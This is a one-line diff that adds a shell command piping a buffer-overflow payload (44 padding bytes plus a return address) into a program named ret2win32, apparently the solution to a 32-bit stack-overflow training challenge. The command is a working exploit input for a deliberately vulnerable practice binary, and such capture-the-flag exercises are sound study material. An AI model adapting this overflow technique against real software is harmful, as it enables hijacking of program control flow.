@@ -1,0 +1,1 @@
+python2 -c 'print("A" * 44 + "\x2c\x86\x04\x08")' | ./ret2win32
